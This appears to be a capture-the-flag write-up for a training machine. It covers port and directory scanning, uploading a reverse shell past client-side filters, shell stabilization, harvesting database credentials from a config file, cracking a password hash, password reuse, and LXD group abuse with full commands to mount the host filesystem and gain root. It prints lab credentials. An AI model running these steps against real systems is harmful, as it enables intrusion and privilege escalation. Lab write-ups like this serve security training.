# [Day 24] Special by DarkStar - The Trial Before Christmas

## Topics

- Client Side Filters
- Shell Upgrading and Stabilization
- MySQL Client
- Online Password Cracking
- Privilege Escalation with LXD

### 1. Scan the machine. What ports are open?
```
80, 65000
```
Do a simple nmap scan `nmap -sC -sV 10.10.x.x`

__nmap output:__
```
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
65000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Light Cycle
MAC Address: 02:69:BC:C9:25:45 (Unknown)
```

### 2. What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step.
```
light cycle
```
Enter the Machine's IP address as well as poort 65000 `10.10.x.x:65000` into the browser

### 3. What is the name of the hidden php page?
```
uploads.php
```
Run a gobuster scan with the file extension of php `gobuster dir -u http://10.10.212.94:65000 -w /usr/share/wordlists/dirb/big.txt -x .php`

__found directories:__
```
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/api (Status: 301)
/assets (Status: 301)
/grid (Status: 301)
/index.php (Status: 200)
/server-status (Status: 403)
/uploads.php (Status: 200)
```

### 4. What is the name of the hidden directory where file uploads are saved?
```
grid
```

### 5. Bypass the filters. Upload and execute a reverse shell.

### 6. What is the value of the web.txt flag?

Thanks to the hint we know the folder where we can find the flag `/var/www/`. Cat the flag with `cat /var/www/web.txt`.

### 7. Upgrade and stabilize your shell. 

1. On the reverse shell, use `python3 -c 'import pty;pty.spawn("/bin/bash")'`
2. Then run `export TERM=xterm`
3. Press Ctrl+Z to background the shell. This will return us to our terminal
4. In our terminal, run `stty raw -echo; fg`
5. Wait for a few seconds and you should get the reverse shell back

### 8. Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password
```
tron:IFightForTheUsers
```
1. Change your directory to /var/www/TheGrid/ `cd /var/www/TheGrid/`
2. Do `ls` to see all available directories. You can try and explore the different files and folders to see if you can find it. 
3. The folder containing the answer is __includes__ `cd includes/`
4. Do `ls` again
5. We see a bunch of php scripts, but one of them contains authorization credentials, `dbauth.php`. Just read the file with `cat dbauth.php`

### 9. Access the database and discover the encrypted credentials. What is the name of the database you find these in?
```
tron
```
1. Connect to the mysql db with `mysql -utron -p`
2. Enter the password `IFightForTheUsers`
3. Once we have acces to mysql, run `show databases;` 

### 10. Crack the password. What is it?
```
@computer@
```
1. Run `use tron;` to change databases.
2. Do `show tables;` to see what tables we have available.
3. Display all the information in the tables with `select * from users;`
4. Copy the password of the only user in the table
5. Paste it into a password cracking website like [CrackStation](https://crackstation.net/)

### 11. Use su to login to the newly discovered user by exploiting password reuse. 

1. Exit out of mysql with `exit`
2. switch users with `su flynn`
3. Type in the password `@computer@`

### 12. What is the value of the user.txt flag?

Thanks to the hint, we know it's located in `/home/flynn/`. We can just cat it out.

### 13. Check the user's groups. Which group can be leveraged to escalate privileges?
```
lxd
```
Run `id` to find the answer

### 14. Abuse this group to escalate privileges to root.

1. Make sure you have the Alpine image with `lxc image list`
2. Follow the sequence of commands explained in the dossier. Here they are:
    - `lxc init Alpine strongbad -c security.privileged=true`
    - `lxc config device add strongbad trogdor disk source=/ path/mnt/root recursive=true`
    - `lxc start strongbad`
    - `lxc exec strongbad /bin/sh`
3. We should get a shell back. Run `id` to make sure we are root.
4. Change directory `cd /mnt/root/root` to find the flag.

### 15. What is the value of the root.txt flag?

